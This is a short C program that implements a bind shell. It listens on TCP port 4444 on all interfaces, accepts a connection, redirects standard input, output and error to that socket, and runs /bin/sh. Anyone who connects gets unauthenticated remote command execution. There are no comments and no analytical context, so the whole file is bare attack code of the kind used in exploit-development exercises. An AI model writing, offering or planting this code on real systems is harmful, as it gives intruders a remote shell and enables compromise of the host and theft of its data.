#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main() {
    int sock_fd;
    int clnt_fd;
    socklen_t socklen;
    struct sockaddr_in sock_addr;
    struct sockaddr_in clnt_addr;
    
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(4444);
    sock_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    
    sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    bind(sock_fd, (struct sockaddr*)&sock_addr, sizeof(sock_addr));
    listen(sock_fd, 0);
    
    socklen = sizeof(clnt_addr);
    clnt_fd = accept(sock_fd, (struct sockaddr*)&clnt_addr, &socklen);
    
    dup2(clnt_fd, 0);
    dup2(clnt_fd, 1);
    dup2(clnt_fd, 2);
    execve("/bin/sh", NULL, NULL);
}
